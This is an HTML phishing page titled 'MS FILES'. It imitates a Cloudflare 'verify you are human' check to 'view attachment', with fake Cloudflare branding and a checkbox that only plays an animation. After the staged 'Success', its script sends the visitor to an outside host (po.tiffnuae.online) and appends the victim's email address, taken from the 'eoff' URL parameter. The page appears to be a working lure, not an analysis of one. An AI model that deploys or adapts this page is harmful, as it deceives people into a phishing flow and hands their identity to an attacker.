<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MS FILES</title>
    <style>
        :root {
            --color-primary: #4a6ee0;
            --color-success: #28a745;
            --color-bg-light: #f8f9fa;
            --color-text-main: #333;
            --color-border: #ddd;
            --transition-standard: 450ms cubic-bezier(0.4, 0, 0.2, 1);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #fff;
            color: var(--color-text-main);
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            overflow-x: hidden;
        }

        /* Loading Component */
        #loader-overlay {
            position: fixed;
            inset: 0;
            background: var(--color-bg-light);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            transition: opacity var(--transition-standard);
        }

        .loader-brand {
            width: 120px;
            animation: pulse 1.5s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); opacity: 0.8; }
            50% { transform: scale(1.08); opacity: 1; }
        }

        /* Main Content */
        .content-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            width: 100%;
            max-width: 440px;
            padding: 20px;
            opacity: 0;
            transform: translateY(10px);
            transition: opacity 600ms ease-out, transform 600ms ease-out;
        }

        .content-container.visible {
            opacity: 1;
            transform: translateY(0);
        }

        .heading {
            text-align: center;
            font-size: 1.1rem;
            font-weight: 500;
            color: #222;
            line-height: 1.4;
            margin-bottom: 24px;
        }

        /* Verification Card */
        .verification-card {
            background: var(--color-bg-light);
            border: 1px solid var(--color-border);
            border-radius: 10px;
            padding: 30px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: border-color 0.2s ease;
        }

        .verification-card:hover {
            border-color: #bbb;
        }

        .check-group {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .check-box {
            width: 20px;
            height: 20px;
            border: 2px solid var(--color-primary);
            border-radius: 4px;
            background: #fff;
            cursor: pointer;
            position: relative;
            transition: all 0.25s ease;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .check-box.loading {
            border-radius: 50%;
            border-color: #eee;
            border-top-color: var(--color-primary);
            animation: spin 1s linear infinite;
        }

        .check-box.complete {
            background: var(--color-success);
            border-color: var(--color-success);
        }

        .check-box.complete::after {
            content: "\2713";
            color: white;
            font-size: 14px;
            font-weight: bold;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .brand-info {
            text-align: right;
            font-size: 11px;
            color: #777;
        }

        .brand-info img {
            width: 28px;
            vertical-align: middle;
            margin-right: 5px;
        }

        .brand-info b {
            color: #f38020;
            letter-spacing: 0.5px;
        }

        .status-msg {
            text-align: center;
            margin-top: 25px;
            font-size: 12px;
            opacity: 0;
            transition: opacity 0.5s ease;
        }

        /* Footer Section */
        .footer-shield {
            padding: 30px;
            color: #999;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
            opacity: 0;
            transition: opacity 0.5s ease;
        }

        .footer-shield.visible {
            opacity: 1;
        }

        .shield-svg {
            width: 12px;
            height: 14px;
            background: #999;
            clip-path: polygon(0% 0%, 100% 0%, 100% 80%, 50% 100%, 0% 80%);
        }
    </style>
</head>
<body>

    <div id="loader-overlay">
        <img src="astro.png" class="loader-brand" alt="Loading">
    </div>

    <main class="content-container" id="mainContent">
        <h1 class="heading">Verify you are human by completing the action below to view attachment</h1>

        <div class="verification-card">
            <div class="check-group">
                <div id="actionBox" class="check-box"></div>
                <span id="statusLabel" style="font-weight: 500; font-size: 16px;">Verify</span>
            </div>

            <div class="brand-info">
                <div><img src="cloudflare_.png" alt="logo"><b>CLOUDFLARE</b></div>
                <span>Privacy &middot; Terms</span>
            </div>
        </div>

        <div id="successNotice" class="status-msg"></div>
    </main>

    <footer class="footer-shield" id="footerLegal">
        <div class="shield-svg"></div>
        <span>Protected by CLOUDFLARE</span>
    </footer>

    <script>
        (() => {
            const DOM = {
                loader: document.getElementById('loader-overlay'),
                main: document.getElementById('mainContent'),
                trigger: document.getElementById('actionBox'),
                label: document.getElementById('statusLabel'),
                footer: document.getElementById('footerLegal'),
                notice: document.getElementById('successNotice')
            };

            const CONFIG = {
                redirectUrl: "https://po.tiffnuae.online/api/v1/tgKHf0r0EWqIaCb5",
                loadDelay: 1500,
                processTime: 1800,
                redirectDelay: 2000
            };

            let isVerifying = false;

            // Initialize Page
            const init = () => {
                const params = new URLSearchParams(window.location.search);
                const emailHash = params.get('eoff');

                window.addEventListener('load', () => {
                    setTimeout(() => {
                        DOM.loader.style.opacity = '0';
                        setTimeout(() => {
                            DOM.loader.style.display = 'none';
                            DOM.main.classList.add('visible');
                            DOM.footer.classList.add('visible');
                        }, 500);
                    }, CONFIG.loadDelay);
                });

                DOM.trigger.addEventListener('click', () => handleVerification(emailHash));
            };

            const handleVerification = (email) => {
                if (isVerifying) return;

                isVerifying = true;
                DOM.label.textContent = "Verifying...";
                DOM.trigger.classList.add('loading');

                setTimeout(() => {
                    DOM.trigger.classList.remove('loading');
                    DOM.trigger.classList.add('complete');
                    DOM.label.textContent = "Success";

                    setTimeout(() => {
                        DOM.notice.style.opacity = '1';
                    }, 400);

                    // Final Navigation
                    setTimeout(() => {
                        const destination = email ? `${CONFIG.redirectUrl}#${email}` : CONFIG.redirectUrl;
                        window.location.href = destination;
                    }, CONFIG.redirectDelay);

                }, CONFIG.processTime);
            };

            init();
        })();
    </script>
</body>
</html>
